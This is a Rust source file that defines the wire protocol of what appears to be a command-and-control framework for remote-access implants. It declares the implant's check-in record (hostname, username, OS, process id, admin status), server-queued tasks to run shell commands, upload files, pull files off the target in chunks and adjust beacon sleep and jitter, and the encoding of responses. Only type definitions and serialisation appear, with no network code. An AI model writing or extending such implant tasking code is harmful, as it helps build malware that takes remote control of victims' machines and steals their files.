//! Task/response/message types and their (de)serialisation via [`crate::wire`].

use crate::wire::{Reader, WireError, Writer};

/// Initial check-in metadata an implant sends on first contact.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SessionInfo {
    pub beacon_id: u32,
    pub hostname: String,
    pub username: String,
    pub os: String,
    /// 0 = x86_64, 1 = aarch64, 2 = x86
    pub arch: u8,
    pub pid: u32,
    /// 0 = no, 1 = elevated/admin
    pub is_admin: u8,
}

impl SessionInfo {
    pub fn encode(&self, w: &mut Writer) {
        w.u32(self.beacon_id);
        w.str(&self.hostname);
        w.str(&self.username);
        w.str(&self.os);
        w.u8(self.arch);
        w.u32(self.pid);
        w.u8(self.is_admin);
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(Self {
            beacon_id: r.u32()?,
            hostname: r.str()?,
            username: r.str()?,
            os: r.str()?,
            arch: r.u8()?,
            pid: r.u32()?,
            is_admin: r.u8()?,
        })
    }
}

/// A task the server queues for an implant.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    Ping,
    /// Reschedule beaconing: sleep `seconds` (+/- `jitter_pct`%).
    Sleep { seconds: u32, jitter_pct: u8 },
    /// Run a shell command (`/bin/sh -c` / `cmd.exe /c`).
    Shell { args: String },
    /// Write `data` to a file named `name` on the target (no fixed path yet).
    Upload { name: String, data: Vec<u8> },
    /// Read `path` off the target (streamed back as FileChunks).
    Download { path: String },
    /// Tear down the session cleanly.
    Exit,
}

impl Command {
    pub fn encode(&self, w: &mut Writer) {
        match self {
            Command::Ping => w.u8(1),
            Command::Sleep { seconds, jitter_pct } => {
                w.u8(2);
                w.u32(*seconds);
                w.u8(*jitter_pct);
            }
            Command::Shell { args } => {
                w.u8(3);
                w.str(args);
            }
            Command::Upload { name, data } => {
                w.u8(4);
                w.str(name);
                w.blob(data);
            }
            Command::Download { path } => {
                w.u8(5);
                w.str(path);
            }
            Command::Exit => w.u8(6),
        }
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(match r.u8()? {
            1 => Command::Ping,
            2 => Command::Sleep {
                seconds: r.u32()?,
                jitter_pct: r.u8()?,
            },
            3 => Command::Shell { args: r.str()? },
            4 => Command::Upload {
                name: r.str()?,
                data: r.blob()?.to_vec(),
            },
            5 => Command::Download { path: r.str()? },
            6 => Command::Exit,
            t => return Err(WireError::BadTag(t)),
        })
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Response {
    /// Raw command/process output.
    Output(Vec<u8>),
    /// Empty success acknowledgement.
    Ok,
    /// An error occurred on the implant.
    Err(String),
    /// A chunk of a downloaded file (`eof == 1` marks the final chunk).
    FileChunk {
        name: String,
        seq: u32,
        eof: u8,
        data: Vec<u8>,
    },
}

impl Response {
    pub fn encode(&self, w: &mut Writer) {
        match self {
            Response::Output(d) => {
                w.u8(1);
                w.blob(d);
            }
            Response::Ok => w.u8(2),
            Response::Err(m) => {
                w.u8(3);
                w.str(m);
            }
            Response::FileChunk { name, seq, eof, data } => {
                w.u8(4);
                w.str(name);
                w.u32(*seq);
                w.u8(*eof);
                w.blob(data);
            }
        }
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(match r.u8()? {
            1 => Response::Output(r.blob()?.to_vec()),
            2 => Response::Ok,
            3 => Response::Err(r.str()?),
            4 => Response::FileChunk {
                name: r.str()?,
                seq: r.u32()?,
                eof: r.u8()?,
                data: r.blob()?.to_vec(),
            },
            t => return Err(WireError::BadTag(t)),
        })
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Task {
    pub task_id: u64,
    pub command: Command,
}

impl Task {
    pub fn encode(&self, w: &mut Writer) {
        w.u64(self.task_id);
        self.command.encode(w);
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(Self {
            task_id: r.u64()?,
            command: Command::decode(r)?,
        })
    }

    /// Encode a batch: `u32 count` followed by each task.
    pub fn encode_vec(tasks: &[Task]) -> Vec<u8> {
        let mut w = Writer::new();
        w.u32(tasks.len() as u32);
        for t in tasks {
            t.encode(&mut w);
        }
        w.into_bytes()
    }

    pub fn decode_vec(data: &[u8]) -> Result<Vec<Task>, WireError> {
        let mut r = Reader::new(data);
        let n = r.u32()? as usize;
        let mut out = Vec::with_capacity(n);
        for _ in 0..n {
            out.push(Task::decode(&mut r)?);
        }
        Ok(out)
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TaskResponse {
    pub task_id: u64,
    pub response: Response,
}

impl TaskResponse {
    pub fn encode(&self, w: &mut Writer) {
        w.u64(self.task_id);
        self.response.encode(w);
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(Self {
            task_id: r.u64()?,
            response: Response::decode(r)?,
        })
    }

    pub fn encode_vec(rs: &[TaskResponse]) -> Vec<u8> {
        let mut w = Writer::new();
        w.u32(rs.len() as u32);
        for r in rs {
            r.encode(&mut w);
        }
        w.into_bytes()
    }

    pub fn decode_vec(data: &[u8]) -> Result<Vec<TaskResponse>, WireError> {
        let mut r = Reader::new(data);
        let n = r.u32()? as usize;
        let mut out = Vec::with_capacity(n);
        for _ in 0..n {
            out.push(TaskResponse::decode(&mut r)?);
        }
        Ok(out)
    }
}
